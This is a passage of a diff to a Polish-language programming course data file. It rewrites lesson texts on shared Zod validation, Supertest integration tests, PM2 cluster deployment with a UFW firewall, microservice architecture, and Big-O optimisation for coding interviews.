 export type RegisterInput = z.infer<typeof RegisterSchema>;
 \`\`\`
-Ten sam obiekt \`RegisterSchema\` waliduje pola na żywo w komponencie React oraz weryfikuje \`req.body\` w middleware Expressa!`,
+Na frontendzie wywołujemy \`RegisterSchema.safeParse(formData)\`, aby natychmiast podświetlić błędne pola pod inputami jeszcze przed wysłaniem żądania. Na backendzie ten sam obiekt \`RegisterSchema\` chroni bazę danych przed błędnym żądaniem, zwracając spójny kod \`400 Bad Request\` oraz mapę błędów pól (\`error.flatten().fieldErrors\`).
+
+**2. Dobre praktyki UX i niezawodności formularzy Full Stack:**
+- **Zależne pola (\`.refine()\`):** Walidacja potwierdzenia hasła (\`password === confirmPassword\`) lub zakresu dat zapisujemy wprost w schemacie z opcją \`path\`, wskazującą dokładnie które pole ma wyświetlić błąd.
+- **Ochrona przed podwójnym wysłaniem:** Przycisk wyślij blokujemy stanem \`disabled={isSubmitting}\`, a serwer może dodatkowo przyjmować klucz idempotentności przy formularzach płatności lub zamówień.`,
       codeExamples: [
         {
           title: 'Weryfikacja tym samym schematem na serwerze i kliencie',
@@ -1415,14 +1438,15 @@ const body = RegisterSchema.parse(req.body); // Gwarantowany typ RegisterInput!`
         'Testować scenariusze brzegowe: brak tokenu (401), błędny payload (400) oraz brak uprawnień roli (403)',
       ],
       prerequisites: ['Testy jednostkowe Vitest', 'Backend Express i Prisma ORM'],
-      theoryMarkdown: `Testy jednostkowe sprawdzają pojedyncze funkcje w izolacji, ale skąd wiesz, czy Twój routing Expressa, middleware autoryzacji JWT, walidator Zod i zapytanie Prisma działają poprawnie **razem**?
+      theoryMarkdown: `Testy jednostkowe dają pewność, że pojedyncze funkcje obliczeniowe działają prawidłowo w izolacji. Jednak aplikacja backendowa to zespół połączonych naczyń: router Expressa przekazuje żądanie do middleware autoryzacji JWT, potem do walidatora Zod, kontrolera i w końcu do zapytania SQL / Prisma w prawdziwej bazie PostgreSQL. Błąd może ukryć się dokładnie na styku tych warstw (np. zły status HTTP, brakujące pole w zapytaniu lub błędne mapowanie kolumny).
 
-Do tego służą **Testy Integracyjne API z biblioteką Supertest**:
+**1. Testy Integracyjne REST API z biblioteką Supertest:**
+Aby przetestować cały łańcuch przetwarzania żądania HTTP w ułamku sekundy, dzielimy aplikację na plik \`app.ts\` (konfiguracja Expressa bez otwierania portu) oraz \`server.ts\` (wywołanie \`app.listen\`). Biblioteka **Supertest** przyjmuje wyeksportowany obiekt \`app\`, symuluje pełne żądania HTTP i pozwala weryfikować kody odpowiedzi, nagłówki (np. ciasteczka \`Set-Cookie\`) oraz ciało JSON:
 \`\`\`ts
 import request from 'supertest';
 import { app } from '../src/app';
 
-test('POST /api/courses zwraca 403 dla roli studenta i 201 dla admina', async () => {
+test('POST /api/courses zwraca 403 dla studenta i 201 dla admina', async () => {
   const studentRes = await request(app)
     .post('/api/courses')
     .set('Authorization', \`Bearer \${studentToken}\`)
@@ -1436,7 +1460,10 @@ test('POST /api/courses zwraca 403 dla roli studenta i 201 dla admina', async ()
   expect(adminRes.status).toBe(201);
   expect(adminRes.body.title).toBe('Nowy kurs');
 });
-\`\`\``,
+\`\`\`
+
+**2. Izolacja bazy testowej i fabryki danych:**
+Testy integracyjne muszą zawsze korzystać z **oddzielnej bazy testowej** (\`TEST_DATABASE_URL\`), nigdy z bazy deweloperskiej ani produkcyjnej! Przed każdym scenariuszem (\`beforeEach\`) czyścimy tabele w odpowiedniej kolejności kluczy obcych i używamy czytelnych funkcji pomocniczych (*Data Factories*, np. \`createTestUser()\`), dzięki czemu każdy test jest deterministyczny i niezależny od kolejności uruchamiania.`,
       codeExamples: [
         {
           title: 'Izolacja bazy testowej przed każdym testem integracyjnym',
@@ -1538,26 +1565,26 @@ test('POST /api/courses zwraca 403 dla roli studenta i 201 dla admina', async ()
         'Zabezpieczyć serwer Ubuntu Linux zaporą UFW (otwarte wyłącznie porty 22/SSH, 80/HTTP i 443/HTTPS)',
       ],
       prerequisites: ['Docker i CI/CD', 'Serwer VPS i Nginx Reverse Proxy'],
-      theoryMarkdown: `Pojedynczy proces Node.js działa na **jednym wątku głównym**. Jeśli Twój serwer VPS posiada 4 lub 8 rdzeni CPU, zwykłe uruchomienie \`node dist/server.js\` wykorzysta tylko 1 rdzeń, a po nieobsłużonym błędzie proces po prostu się wyłączy!
+      theoryMarkdown: `Uruchomienie aplikacji produkcyjnej poleceniem \`node dist/server.js\` bezpośrednio w terminalu SSH to przepis na awarię: po zamknięciu sesji terminala proces zniknie, nieobsłużony wyjątek całkowicie zatrzyma serwer, a na maszynie z 4 lub 8 rdzeniami CPU proces Node.js wykorzysta moc obliczeniową tylko jednego rdzenia.
 
-**Menedżer procesów PM2 i Tryb Cluster:**
-PM2 automatycznie uruchamia kopię aplikacji na każdym rdzeniu procesora i restartuje proces w ułamku sekundy w razie awarii:
+**1. Menedżer procesów PM2 i Tryb Cluster:**
+**PM2** to produkcyjny nadzorca procesów dla Node.js. Automatycznie restartuje aplikację w razie awarii, zbiera logi z automatyczną rotacją (\`pm2-logrotate\`) i potrafi podnieść procesy po restarcie samego systemu Linux (\`pm2 startup && pm2 save\`). W pliku konfiguracyjnym \`ecosystem.config.cjs\` włączamy tryb **\`cluster\`** z opcją \`instances: 'max'\`, dzięki czemu PM2 uruchamia osobny proces roboczy (*worker*) na każdym rdzeniu CPU i sam rozkłada między nie przychodzący ruch:
 \`\`\`js
 // ecosystem.config.cjs
 module.exports = {
   apps: [{
     name: 'fullstack-academy-api',
     script: './dist/server.js',
-    instances: 'max',       // Wykorzystaj wszystkie rdzenie CPU!
-    exec_mode: 'cluster',   // Wbudowany Load Balancing między rdzeniami
-    env_production: {
-      NODE_ENV: 'production',
-      PORT: 3000,
-    },
+    instances: 'max',
+    exec_mode: 'cluster',
+    env_production: { NODE_ENV: 'production', PORT: 3000 },
   }],
 };
 \`\`\`
-Polecenie \`pm2 reload all\` restartuje instancje **jedna po drugiej**, dzięki czemu użytkownicy nie widzą ani sekundy przerwy w działaniu aplikacji (*Zero-Downtime Deployment*).`,
+Uwaga architektoniczna: ponieważ każdy proces w klastrze ma odizolowaną pamięć RAM, sesje użytkowników i cache muszą znajdować się w Redisie lub PostgreSQL, nigdy w lokalnej zmiennej \`Map()\`.
+
+**2. Wdrożenia bez przestoju (\`pm2 reload\`) i Firewall UFW:**
+Polecenie \`pm2 restart\` zabija wszystkie procesy jednocześnie (użytkownicy widzą błąd 502). Natomiast **\`pm2 reload all\`** podmienia instancje sekwencyjnie jedna po drugiej, utrzymując stałą dostępność serwisu (*Zero-Downtime Reload*). Cały serwer VPS zabezpieczamy dodatkowo zaporą **UFW** (*Uncomplicated Firewall*), blokując domyślnie cały ruch przychodzący i otwierając wyłącznie porty \`22\` (SSH z kluczem) oraz \`80/443\` dla Proxy Nginx.`,
       codeExamples: [
         {
           title: 'Konfiguracja zapory sieciowej UFW na serwerze Ubuntu VPS',
@@ -1656,12 +1683,16 @@ sudo ufw enable`,
         'Projektować bezstanowe serwisy gotowe na skalowanie horyzontalne (Horizontal Auto-Scaling)',
       ],
       prerequisites: ['Next.js i SSR', 'Redis, BullMQ i WebSockets'],
-      theoryMarkdown: `Większość udanych startupów zaczyna od **Modularnego Monolitu** — jednej dobrze zorganizowanej aplikacji podzielonej na czyste moduły domenowe (\`auth\`, \`billing\`, \`courses\`). Gdy jednak wybrane części systemu wymagają zupełnie innego skalowania (np. generator wideo obciążający GPU vs prosty serwis profili), wydzielamy **Mikrousługi**.
+      theoryMarkdown: `Większość udanych systemów internetowych nie zaczyna od dziesiątek oddzielnych mikrousług, lecz od **Modularnego Monolitu** — jednej aplikacji o bardzo czytelnych granicach między domenami (\`auth\`, \`billing\`, \`courses\`), łatwej do rozwijania i wdrażania przez mały zespół. Dopiero gdy poszczególne moduły zaczynają mieć diametralnie różne wymagania wydajnościowe (np. serwis konwersji wideo potrzebuje serwerów GPU, a katalog kursów skalowania odczytów) lub pracuje nad nimi kilka niezależnych zespołów, wydzielamy **Mikrousługi**.
 
-**Kluczowe elementy architektury rozproszonej:**
-1. **API Gateway:** Pojedynczy punkt wejścia dla aplikacji frontendowej. Weryfikuje token JWT, pilnuje limitów zapytań (Rate Limit) i kieruje ruch do odpowiedniego serwisu wewnętrznego.
-2. **Database-per-Service:** Każda mikrousługa zarządza własnymi tabelami — żaden serwis nie sięga bezpośrednio do bazy danych innego serwisu!
-3. **Komunikacja Event-Driven (Pub/Sub):** Gdy \`BillingService\` zatwierdzi płatność, publikuje zdarzenie \`OrderPaid\`. \`CourseService\` nasłuchuje tego zdarzenia i odblokowuje kurs, a \`EmailService\` wysyła fakturę PDF.`,
+**1. API Gateway jako pojedynczy punkt wejścia:**
+Zamiast zmuszać frontend do pamiętania adresów dziesięciu wewnętrznych serwisów, stawiamy przed nimi bramę **API Gateway**. Przejmuje ona w jednym miejscu obsługę CORS, weryfikację tokenów JWT, *Rate Limiting* oraz trasowanie ruchu do właściwego serwisu w sieci wewnętrznej (np. \`/api/payments/*\` kieruje do \`BillingService\`).
+
+**2. Database-per-Service i komunikacja asynchroniczna (*Event-Driven*):**
+Najgorszy antywzorzec to tzw. **Rozproszony Monolit**, w którym pięć mikroserwisów dzieli jedną tabelę albo wykonuje długi łańcuch synchronicznych zapytań REST jeden po drugim (awaria ostatniego serwisu kładzie cały system). Każda usługa powinna mieć własne dane i komunikować zdarzenia asynchronicznie przez broker zdarzeń lub kolejkę (*Pub/Sub*): gdy \`BillingService\` zaksięguje wpłatę, publikuje zdarzenie \`order.paid\`, na które niezależnie reagują \`CourseService\` i \`EmailService\`.
+
+**3. Skalowanie Horyzontalne vs Wertykalne:**
+Skalowanie **wertykalne** (*Scale Up*) to dokupienie RAM/CPU jednej maszynie (ma twardy sufit sprzętowy). Skalowanie **horyzontalne** (*Scale Out*) polega na uruchamianiu wielu identycznych, **bezstanowych** instancji aplikacji za Load Balancerem — zapewnia niemal nieograniczoną skalę oraz wysoką dostępność (*High Availability*), bo awaria pojedynczego kontenera nie przerywa pracy systemu.`,
       codeExamples: [
         {
           title: 'Wzorzec publikacji i subskrypcji zdarzenia domenowego (Event Bus)',
@@ -1767,17 +1798,18 @@ eventBus.subscribe('order.paid', async (event) => {
         'Przeprowadzać czystą refaktoryzację zastanego kodu (Early Return, nazewnictwo, eliminacja duplikacji)',
       ],
       prerequisites: ['Symulator Live Coding', 'Tablice i obiekty w JavaScript/TypeScript'],
-      theoryMarkdown: `Na rozmowie technicznej rekruter nie szuka osoby, która wykuła na pamięć 500 zagadek, lecz inżyniera, który **głośno komunikuje tok myślenia**, potrafi zauważyć wąskie gardło wydajnościowe i pisze czytelny kod.
+      theoryMarkdown: `Podczas rozmowy technicznej (*Live Coding*) rekruter nie sprawdza, czy pamiętasz na pamięć 300 łamigłówek algorytmicznych, lecz obserwuje **jak analizujesz problem**, **czy głośno komunikujesz swoje decyzje**, jak wychwytujesz przypadki brzegowe (*Edge Cases*, np. pusta tablica lub wartości ujemne) oraz jak dbasz o czytelność i wydajność kodu.
 
-**Złota zasada optymalizacji na Live Coding (\`O(n²)\` $\\rightarrow$ \`O(n)\`):**
-Gdy widzisz pętlę w pętli (\`for\` wewnątrz \`for\` lub \`.find()\` wewnątrz \`.map()\`), dla 10 000 elementów program wykona **100 000 000 operacji** (\`O(n²)\`).
-Zastępując wewnętrzne wyszukiwanie słownikiem **\`new Map()\`** lub zbiorem **\`new Set()\`** (czas odczytu \`O(1)\`), redukujesz cały algorytm do jednego przebiegu **\`O(n)\`**!
+**1. Notacja Big-O — jak szybko rośnie czas pracy kodu?**
+Gdy dla wejścia o rozmiarze \`n\` używasz pojedynczej pętli po tablicy, złożoność czasowa wynosi **\`O(n)\`** (czas liniowy — 10x więcej danych to 10x dłuższa praca). Jeśli jednak wewnątrz jednej pętli umieścisz drugą pętlę albo ukryte przeszukiwanie (\`.includes()\`, \`.indexOf()\`, \`.find()\`), złożoność rośnie kwadratowo do **\`O(n²)\`**! Dla 10 000 zamówień to już **100 milionów porównań** i wyraźne zacięcie serwera.
 
+**2. Złota sztuczka rekrutacyjna: redukcja \`O(n²)\` → \`O(n)\` dzięki \`Map\` i \`Set\`:**
+Struktury haszujące **\`Map\`** (słownik klucz → wartość) oraz **\`Set\`** (zbiór unikalnych elementów) oferują wyszukiwanie metodami \`.has()\` i \`.get()\` w średnim czasie stałym **\`O(1)\`**. Zamiast szukać w kółko po tablicy, raz budujemy indeks i przechodzimy dane w jednym przebiegu:
 \`\`\`ts
-// Wolne O(n²) — .includes() wewnątrz pętli:
-const duplicates = items.filter((item, index) => items.indexOf(item) !== index);
+// Wolne O(n²) — .indexOf() w środku pętli:
+const slow = items.filter((item, index) => items.indexOf(item) !== index);
 
-// Błyskawiczne O(n) z użyciem Set:
+// Błyskawiczne O(n) — jeden przebieg z użyciem Set:
 function findDuplicates<T>(items: T[]): T[] {
   const seen = new Set<T>();
   const duplicates = new Set<T>();
@@ -1787,7 +1819,10 @@ function findDuplicates<T>(items: T[]): T[] {
   }
   return Array.from(duplicates);
 }
-\`\`\``,
+\`\`\`
+
+**3. Refaktoryzacja i czysty kod (*Early Return*):**
+Zamiast pisać głęboko zagnieżdżone drabinki \`if { if { if { ... } } }\`, najpierw sprawdzaj warunki brzegowe lub błędy na początku funkcji i od razu wychodź instrukcją \`return\` (*Guard Clauses*). Taki kod czyta się płynnie od góry do dołu jak dobrze napisany artykuł.`,
       codeExamples: [
         {
           title: 'Klasyczne zadanie rekrutacyjne Two Sum w czasie liniowym O(n)',
